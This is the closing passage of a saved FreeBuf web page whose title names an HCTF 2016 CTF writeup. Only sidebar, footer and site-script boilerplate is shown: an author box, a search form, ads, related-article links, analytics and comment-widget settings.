        });
    });    
});
</script>    </div>
        <div class="col-md-3 visible-md-block visible-lg-block">
      <div class="panel panel-default">
        <div class="author-wrap">
          <div class="author-header"><img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/admin-avatar.png" width="96" height="96" alt="sysorem" class="avatar avatar-100 wp-user-avatar wp-user-avatar-100 photo"></div>
          <p class="name"><a href="http://www.freebuf.com/author/sysorem" title="由 sysorem 发布" rel="author">sysorem</a><span></span></p>
          <p class="signature">我觉得二狗说的对～</p>
          <p class="art-com"><span class="aut-article"><a href="http://www.freebuf.com/author/sysorem" target="_blank">5篇文章</a></span><span class="aut-comment"><a href="http://www.freebuf.com/author/sysorem?comment=1" target="_blank">11条评论</a></span></p>
        </div>
      </div>
	  <script type="text/javascript">
	          var dispatch = function() {
              q = document.getElementById("q");
              if (q.value != "") {
                  window.open('http://www.freebuf.com/?s=' + q.value, "_blank");
                     return false;
                   } else {
                       return false;
                       }
             }
	  </script>
      <div class="form-group has-active search-col search-in">
        <form id="hpsform-new" class="navbar-search navbar-form" onsubmit="return dispatch()">
          <div class="form-group">
            <input id="q" class="input form-control" type="text" placeholder="关键字查找" autocomplete="off" title="关键字查找" name="q">
            <button class="submit" onclick="INTEL_TYPE_AHEAD.onSubmitHps(&#39; 关键字查找&#39;, &#39;/content/www/cn/zh&#39;, &#39;zh_CN&#39;)" value="Search" type="submit"></button>
          </div>
        </form>
      </div>
      <div class="ad-right" style="margin-bottom:24px;">
        <a href="http://www.huodongxing.com/event/2351278105600" target="_blank"><img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/14794591326254.jpg"></a>
      </div>
   
      <div class="panel panel-default">
        <div class="read visible-md-block visible-lg-block">
          <div class="main-tit02">
            <h3>相关阅读</h3>
          </div>		
          <ul></ul><ul>
  <li><a href="http://www.freebuf.com/articles/105793.html" target="_blank" title="利用PHP" 7中的opcache来实现webshell="">利用PHP 7中的OPcache来实现Webshell</a></li>
  
  <li><a href="http://www.freebuf.com/news/65138.html" target="_blank" title="匿名者（Anonymous）组织攻下以色列武器制造商网站，泄露大量客户信息">匿名者（Anonymous）组织攻下以色列武器制造商网站，泄露大量客户信息</a></li>
  
  <li><a href="http://www.freebuf.com/news/others/27060.html" target="_blank" title="周末阅读：程序员的《权利法案》">周末阅读：程序员的《权利法案》</a></li>
  
  <li><a href="http://www.freebuf.com/articles/others-articles/68919.html" target="_blank" title="玩爆EDUP智能插座（Part1）">玩爆EDUP智能插座（Part1）</a></li>
  
  <li><a href="http://www.freebuf.com/articles/web/9883.html" target="_blank" title="[渗透技巧]python脚本处理伪静态注入">[渗透技巧]python脚本处理伪静态注入</a></li>
  </ul>        </div>
      </div>
      <!--<div class="ad-wrap"><a href="http://www.ijiami.cn/?freebuf.com" target="_blank"><img width="100%" src="http://image.3001.net/images/20141201/14174039186901.jpg"></a></div>-->
      <div class="panel panel-default rec-spe">
        <div class="main-tit03 colour-blue">
          <h3>特别推荐</h3>
        </div>
         
      </div>
	  <div id="mar-right">
      <!--<div class="read visible-lg-block">
        <div class="main-tit04">
          <h3>商城新品</h3>
        </div>
        <div id="slider" class="nivoSlider">  </div>
      </div>-->
      <div class="panel panel-default code"> <img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/code.jpg" width="192" height="192">
        <p>关注我们  分享每日精选文章</p>
      </div>
	  </div>
    </div>
  </div>
  <div class="row marvellous visible-lg-block">
    <h3>不容错过</h3>
    <ul>
      <li><a href="http://www.freebuf.com/news/29480.html" rel="bookmark" title="FreeBuf与虎嗅网建立合作伙伴关系">FreeBuf与虎嗅网建立合作伙伴关系</a>
        <p>		  <span class="name"><a href="http://www.freebuf.com/author/fb%e7%8b%ac%e5%ae%b6" title="由 FB独家 发布" rel="author">FB独家</a></span>
		  		<span class="time">2014-03-21</span></p>
      </li>
      <li><a href="http://www.freebuf.com/fevents/71976.html" rel="bookmark" title="【已结束】2015阿里安全峰会图文直播">【已结束】2015阿里安全峰会图文直播</a>
        <p>		  <span class="name"><a href="http://www.freebuf.com/author/fb%e7%8b%ac%e5%ae%b6" title="由 FB独家 发布" rel="author">FB独家</a></span>
		  		<span class="time">2015-07-09</span></p>
      </li>
      <li><a href="http://www.freebuf.com/sectool/63360.html" rel="bookmark" title="使用CommView for WiFi抓取无线报文">使用CommView for WiFi抓取无线报文</a>
        <p>		  <span class="name"><a href="http://www.freebuf.com/author/pklpkl0" title="由 pklpkl0 发布" rel="author">pklpkl0</a></span>
		  		<span class="time">2015-04-09</span></p>
      </li>
      <li><a href="http://www.freebuf.com/sectool/107237.html" rel="bookmark" title="运用Fluxion高效破解WiFi密码">运用Fluxion高效破解WiFi密码</a>
        <p>		  <span class="name"><a href="http://www.freebuf.com/author/arthurkiller" title="由 ArthurKiller 发布" rel="author">ArthurKiller</a></span>
		  		<span class="time">2016-06-21</span></p>
      </li>
    </ul>
  </div>
</div>
<script type="text/javascript">
  $(window).load(function() {
    $('#slider').nivoSlider();
  });
  $('#contenttxt img').removeAttr('height');
  $('#contenttxt img').wrap(function(){
    if(!$(this).parent().attr('href')){
      var imgurl = $(this).attr('data-original');
      if(imgurl.substr(-6)=='!small'){
        imgurl = imgurl.substring(0,imgurl.length-6);
      }
      return '<a href="' + imgurl + '" class="highslide-image" onclick="return hs.expand(this);" target="_blank"></a>';
    }
  })
</script>
<script src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/comments-ajax.js" type="text/javascript"></script>
<script type="text/javascript" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/jquery.nivo.slider.pack.js"></script>
<!----------footer---------->
<div class="footer">
  <div class="container">
    <div class="footer-list col-sm-2 col-md-2">
      <h3>FREEBUF</h3>
      <ul>
        <li><a href="http://www.freebuf.com/dis">免责声明</a></li>
        <li><a href="http://www.freebuf.com/news/others/864.html">关于我们</a></li>
        <li><a href="http://www.freebuf.com/jobs/40386.html">加入我们</a></li>
        <li><a href="http://www.freebuf.com/donate">捐助我们</a></li>
      </ul>
    </div>
    <div class="footer-list col-sm-2 col-md-2">
      <h3>广告及服务</h3>
      <ul>
        <li><a target="_blank" href="mailto:root@freebuf.com">寻求报道</a></li>
        <li><a href="http://www.freebuf.com/advertise">广告合作</a></li>
        <li><a target="_blank" href="mailto:help@freebuf.com">联系我们</a></li>
        <li><a href="http://www.freebuf.com/friends">友情链接</a></li>
      </ul>
    </div>
    <div class="footer-list col-sm-2 col-md-2">
      <h3>关注我们</h3>
      <ul>
        <li><div class="weixin-pannel weixin"><a class="qr" href="javascript:viod(0);"><span class="g-icon-qr1">官方微信</span><i></i></a></div></li>
        <li><a rel="nofollow" target="_blank" href="http://weibo.com/freebuf">新浪微博</a></li>
        <li><a rel="nofollow" target="_blank" href="http://t.qq.com/freebuf">腾讯微博</a></li>
        <li><a rel="nofollow" target="_blank" href="http://twitter.com/freebuf">Twitter</a></li>
      </ul>
    </div>
    <div class="footer-list col-sm-2 col-md-2">
      <h3>赞助商</h3>
      <ul>
        <li style="padding:6px 0 10px;"><a rel="nofollow" target="_blank" href="http://www.aliyun.com/?freebuf"></a></li>
        <li><a rel="nofollow" target="_blank" href="http://www.upyun.com/?freebuf"></a></li>
        <li style="padding:6px 0 10px;"><a rel="nofollow" target="_blank" href="https://www.trustasia.com/?freebuf"></a></li>
      </ul>
    </div>
    <div class="footer-list col-sm-2 col-md-2">
      <ul>
      </ul>
    </div>
    <div class="footer-logo col-sm-2 col-md-2 pull-right"><img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/freebufrobot_shendanjie.png"></div>
  </div>
  <div class="copyright"><div class="container"><p>Copyright © 2013 WWW.FREEBUF.COM All Rights Reserved <a rel="nofollow" target="_blank" href="http://www.miitbeian.gov.cn/">沪ICP备13033796号</a></p><span><a rel="nofollow" target="_blank" href="http://click.aliyun.com/m/1336/?freebuf"><img src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/icon-aly.png"></a></span></div></div>
</div>
<div class="bottom_tools" style="bottom: 40px;"><a id="scrollUp" href="javascript:;" title="飞回顶部" style="display: block;"></a></div>
<!----------footer end----------> 
<script src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/backtop.js"></script>
<script type="text/javascript">
jQuery(function(){	
	jQuery('.tabPanes ul li').click(function(){
		jQuery(this).addClass('hit').siblings().removeClass('hit');
		jQuery('.panesl>div:eq('+jQuery(this).index()+')').show().siblings().hide();	
	})
	jQuery('.vulbox-nav').click(function(e) { 
        e.stopPropagation(); 
    });  
})
</script>
<script type="text/javascript">
var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fcc53db168808048541c6735ce30421f5' type='text/javascript'%3E%3C/script%3E"));
</script><script src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/h.js" type="text/javascript"></script>
<img alt="css.php" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/css.php" width="1" height="1"><script type="text/javascript">
jQuery(function() {
    jQuery(".simditor pre").each(function(i, block){
        hljs.highlightBlock(block);    
    });
    hljs.initHighlightingOnLoad();
});
</script>
<script>
/* <![CDATA[ */
var rcGlobal = {
	serverUrl		:'http://www.freebuf.com',
	infoTemp		:'%REVIEWER% on %POST%',
	loadingText		:'Loading',
	noCommentsText	:'No comments',
	newestText		:'&laquo; 最新',
	newerText		:'&laquo; 新一点',
	olderText		:'旧一点 &raquo;',
	showContent		:'1',
	external		:'1',
	avatarSize		:'32',
	avatarPosition	:'left',
	anonymous		:'Anonymous'
};
/* ]]> */
</script>
<script type="text/javascript" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/wp-recentcomments-jquery.js"></script>



<!-- Dynamic page generated in 0.771 seconds. -->
<!-- Cached page generated by WP-Super-Cache on 2016-12-05 16:20:03 -->

<!-- Super Cache dynamic page detected but late init not set. See the readme.txt for further details. -->
<!-- Dynamic Super Cache --></body></html>